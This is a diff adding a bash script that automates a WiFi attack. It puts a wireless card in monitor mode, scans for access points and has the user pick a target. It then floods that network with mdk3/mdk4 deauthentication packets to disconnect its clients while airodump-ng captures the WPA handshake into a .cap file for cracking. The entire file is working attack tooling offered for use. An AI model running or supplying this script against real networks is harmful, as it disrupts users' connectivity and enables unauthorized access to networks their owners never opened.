@@ -1,0 +1,273 @@
+#!/bin/bash
+
+#ding yi var
+wlan_card=$1
+work_dir=$(dirname $(realpath $0))/temp
+result_dir=$(dirname $(realpath $0))/result
+ip a |grep "${wlan_card}" >/dev/null 2>&1
+interface_status=$?
+
+#pan duan shi fou root yon hu yun xing
+if [ "${UID}" != "0" ]; then
+	echo -e "\033[31mPermission denied, please run this script as root.\033[0m"
+	exit 1
+fi
+
+#pan duan shi  fou  shu  ru  wlan_card
+if [ -z ${wlan_card} ];then
+	echo "wlan_card is null , please input wlan_card"
+	echo -e "\033[31mNotice: wlan_card is monintor mode name it's maybe like mon0 || wlan0 || wlan0mon || fluxwl0..\033[0m"
+	echo -e "\033[32mUsage\033[0m: bash $0 wlan_card ; exmple: bash $0 mon0"
+	exit
+fi
+
+#an zhuang yi lai ruan jian function
+install_dependent_software() {
+apt update
+if [ $? -ne 0 ]; then
+	echo -e "\033[31mnetwork error\033[0m"
+	exit 1
+fi
+apt install $1 -y
+if [ $? -ne 0 ]; then
+	echo -e "\033[31mnetwork error\033[0m"
+	exit 1
+fi
+}
+
+#pan  duan  shi  fou  an zhuang  le  yi  lai  ruan  jian
+for i in mdk3 mdk4 airmon-ng airodump-ng xterm dos2unix
+do
+	type ${i} >/dev/null 2>&1
+	exit_code=$?
+	if [ ${exit_code} -eq 0 ]; then
+		echo -e "${i}.....................\033[32mOK\033[0m"
+	else
+		echo -e "${i}.....................\033[33mInstalling\033[0m"
+		case ${i} in
+			mdk3)
+				install_dependent_software mdk3
+				;;
+			mdk4)
+				install_dependent_software mdk4
+				;;
+			airmon-ng)
+				install_dependent_software aircrack-ng
+				;;
+			airodump-ng)
+				install_dependent_software aircrack-ng
+				;;
+			xterm)
+				install_dependent_software xterm
+				;;
+			dos2unix)
+				install_dependent_software dos2unix
+				;;
+			*)
+				echo -e "\033[31mUknown error..\033[0m"
+				exit 1
+				;;
+		esac
+	fi
+	sleep 1
+done
+
+#pan duan wang ka  shi  fou  kai qi jian  ting
+if [ ${interface_status} -eq 0 ];then
+	echo "start interface to monintor mode..."
+	airmon-ng check kill
+	check_kill=$?
+	ip link set ${wlan_card} down
+	if_down=$?
+	iw dev ${wlan_card} set type monitor
+	if_monitor=$?
+	ip link set ${wlan_card} up
+	if_up=$?
+	if [ ${check_kill} -eq 0 ] && [ ${if_down} -eq 0 ] && [ ${if_monitor} -eq 0 ] && [ ${if_up} -eq 0 ]; then
+		echo -e "\033[32mSUCESS..\033[0m"
+	else
+		echo -e "\033[31mFALED..\033[0m"
+		exit 1
+	fi
+else
+	echo -e "\033[33mThere is no such device ${wlan_card}, please make sure that you plug in the device and work normally\033[0m"
+	exit 1
+fi
+
+#pan duan work_dir shi  fou  cun  zai
+if [ ! -d ${work_dir} ];then
+	mkdir ${work_dir} -p
+fi
+#pan duan result_dir shi  fou  cun  zai
+if [ ! -d ${result_dir} ];then
+	mkdir ${result_dir} -p
+fi
+
+#xuan zhe gon ji mode
+handshake_menu() {
+cat <<EOF
+Select one type what you want to handshake
+************************************
+1.        2.4G                     *
+2.        5G                       *
+************************************
+EOF
+}
+
+
+#handshake 2.4g and 5g function
+handshake_bga() {
+#shao  miao   wifi  into  text wifi_info.txt
+echo "starting scan wifi info into ${work_dir}/dump-01.csv...."
+for i in 1
+do
+	rm -rf ${work_dir}/dump*
+	sleep 3
+	xterm -geometry "107-0+0" -bg "#000000" -fg "#FFFFFF" -title "Scan all AP" -e airodump-ng ${wlan_card} --band $2 -w ${work_dir}/dump &
+	echo $! >${work_dir}/airodump-ng.pid
+	while [ $(ps -ef|grep $(cat ${work_dir}/airodump-ng.pid)|grep -v 'grep'|wc -l) -gt 0 ]
+	do
+		sleep 1
+	done
+	sleep 3
+done
+
+#xian shi sao  miao  jie  guo
+dos2unix ${work_dir}/dump-01.csv
+IFS=$'\n'
+a=1
+for i in $(cat ${work_dir}/dump-01.csv|sed -r '/Station MAC/, +80000{/Station MAC/b; d}'|egrep -v "Station MAC"|egrep -v "SSID,"|egrep -v "^$")
+do
+	echo -e "\033[33m[$a]\033[0m $i"
+	let a++
+done
+
+#xuan zhe yi  ge  xin hao
+read -p "Select one AP what you want to handshake [num]: " ap_num
+while true
+do
+	if [ -z ${ap_num} ]; then
+		clear
+		IFS=$'\n'
+		a=1
+		for i in $(cat ${work_dir}/dump-01.csv|sed -r '/Station MAC/, +80000{/Station MAC/b; d}'|egrep -v "Station MAC"|egrep -v "SSID,"|egrep -v "^$")
+		do
+			echo -e "\033[33m[$a]\033[0m $i"
+			let a++
+		done
+		echo -e "\033[33mAP_num must be a number and can not be null!!\033[0m"
+		read -p "Select one AP what you want to handshake [num]: " ap_num
+	elif [[ ! ${ap_num} =~ ^[0-9]+$ ]]; then
+		clear
+		IFS=$'\n'
+		a=1
+		for i in $(cat ${work_dir}/dump-01.csv|sed -r '/Station MAC/, +80000{/Station MAC/b; d}'|egrep -v "Station MAC"|egrep -v "SSID,"|egrep -v "^$")
+		do
+			echo -e "\033[33m[$a]\033[0m $i"
+			let a++
+		done
+		echo -e "\033[33mAP_num must be a number and can not be null!!\033[0m"
+		read -p "Select one AP what you want to handshake [num]: " ap_num
+	elif [ ${ap_num} -gt $(cat ${work_dir}/dump-01.csv|sed -r '/Station MAC/, +80000{/Station MAC/b; d}'|egrep -v "Station MAC"|egrep -v "SSID,"|egrep -v "^$"|wc -l) ]; then
+		clear
+		IFS=$'\n'
+		a=1
+		for i in $(cat ${work_dir}/dump-01.csv|sed -r '/Station MAC/, +80000{/Station MAC/b; d}'|egrep -v "Station MAC"|egrep -v "SSID,"|egrep -v "^$")
+		do
+			echo -e "\033[33m[$a]\033[0m $i"
+			let a++
+		done
+		echo -e "\033[33mAP_num is great of total number for ap list!!\033[0m"
+		read -p "Select one AP what you want to handshake [num]: " ap_num
+	else
+		break
+	fi
+done
+
+#ding yi mu biao  AP mac and xin dao
+target_mac=$(cat ${work_dir}/dump-01.csv|sed -r '/Station MAC/, +80000{/Station MAC/b; d}'|egrep -v "Station MAC"|egrep -v "SSID,"|egrep -v "^$"|awk -F "," "NR==${ap_num}"'{print $1}')
+target_ap_name=$(cat ${work_dir}/dump-01.csv|sed -r '/Station MAC/, +80000{/Station MAC/b; d}'|grep --text "${target_mac}"|awk -F "," '{print $(NF-1)}'|cut -c 2-)
+cur_channel=$(cat ${work_dir}/dump-01.csv|sed -r '/Station MAC/, +80000{/Station MAC/b; d}'|grep --text "${target_mac}"|awk '{print $6}'|awk -F "," '{print $1}'|egrep -v "^0$"|egrep -v "-"|egrep -v "[0-9]+e"|sort|uniq -c|sort -nk 1|tail -n 1|awk "NR==1"'{print $2}')
+if [ -z ${target_mac} ] || [ "${target_mac}" == "" ]; then
+	echo -e "\033[31mThe target ap mac is null ,now program is exit.\033[0m"
+	exit 1
+fi
+
+#kai qi  zhua  bao  xterm
+if [ -z ${target_ap_name} ] || [ "${target_ap_name}" == "" ]; then
+	echo -e "\033[35mThe handshake program xterm have started.\033[0m"
+	sleep 1
+	for i in 1
+	do
+		rm -rf ${result_dir}/${target_mac//:/-}*
+		sleep 3
+		xterm -geometry "107-0+0" -bg "#000000" -fg "#FFFFFF" -title "Handshake AP for ${target_mac}" -e airodump-ng --ignore-negative-one -d ${target_mac} -w ${result_dir}/${target_mac//:/-} -c ${cur_channel} -a ${wlan_card} &
+		echo $! >${work_dir}/airodump-ng.pid
+		sleep 3
+	done
+else
+	echo -e "\033[35mThe handshake program xterm have started.\033[0m"
+	sleep 1
+	for i in 1
+	do
+		rm -rf ${result_dir}/${target_ap_name}-${target_mac//:/-}*
+		sleep 3
+		xterm -geometry "107-0+0" -bg "#000000" -fg "#FFFFFF" -title "Handshake AP for ${target_mac}" -e airodump-ng --ignore-negative-one -d ${target_mac} -w ${result_dir}/${target_ap_name}-${target_mac//:/-} -c ${cur_channel} -a ${wlan_card} &
+		echo $! >${work_dir}/airodump-ng.pid
+		sleep 3
+	done
+fi
+
+#kai qi gon ji mdk xterm
+echo  "${target_mac}" >${work_dir}/black_mac_list.txt
+echo  "" >>${work_dir}/black_mac_list.txt
+xterm -geometry "71+0+0" -bg "#000000" -fg "#FF0009" -title "Duan kai conn on ${target_mac}" -e $1 ${wlan_card} d -b ${work_dir}/black_mac_list.txt -c ${cur_channel} &
+echo $! >${work_dir}/mdk.pid
+
+#guan bi handshake pid de jian ting program
+i=1
+while [ $(ps -ef|grep $(cat ${work_dir}/airodump-ng.pid)|grep -v 'grep'|wc -l) -gt 0 ]
+do
+	echo -n "Now ${i} seconds has passd.."
+	echo -ne "\r\r"
+	sleep 1
+	let i+=1
+done
+sleep 3
+
+#guan bi gon ji xterm
+echo -e "\033[32mClose the mdk attack xterm...\033[0m"
+cat ${work_dir}/mdk.pid|xargs -i kill {} >/dev/null 2>&1
+while [ $(ps -ef|grep $(cat ${work_dir}/mdk.pid)|grep -v 'grep'|wc -l) -gt 0 ]
+do
+	sleep 1
+done
+sleep 3
+
+#xian shi jie guo info
+if [ -z ${target_ap_name} ] || [ "${target_ap_name}" == "" ]; then
+	echo -e "\033[36mThe handshake cap is saved in [${result_dir}/${target_mac//:/-}-01.cap] \033[0m"
+	exit 0
+else
+	echo -e "\033[36mThe handshake cap is saved in [${result_dir}/${target_ap_name}-${target_mac//:/-}-01.cap] \033[0m"
+	exit 0
+fi
+}
+
+#function ru kou
+while true
+do
+	handshake_menu
+	read -p "Please select: " hand_type
+	case ${hand_type} in
+		1)
+			handshake_bga mdk3 bg
+			;;
+		2)
+			handshake_bga mdk4 a
+			;;
+		*)
+			clear
+			;;
+	esac
+done
